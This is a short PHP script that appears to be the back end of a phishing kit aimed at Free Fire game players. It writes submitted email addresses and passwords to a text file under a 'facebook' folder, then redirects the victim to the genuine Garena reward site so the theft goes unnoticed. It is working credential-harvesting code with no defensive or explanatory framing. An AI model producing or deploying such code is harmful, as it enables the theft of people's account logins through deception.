<?php

file_put_contents("../facebook/mydata.txt", "FREE FIRE Username: " . $_POST['email'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://reward.ff.garena.com/en');
exit();
                                                                  
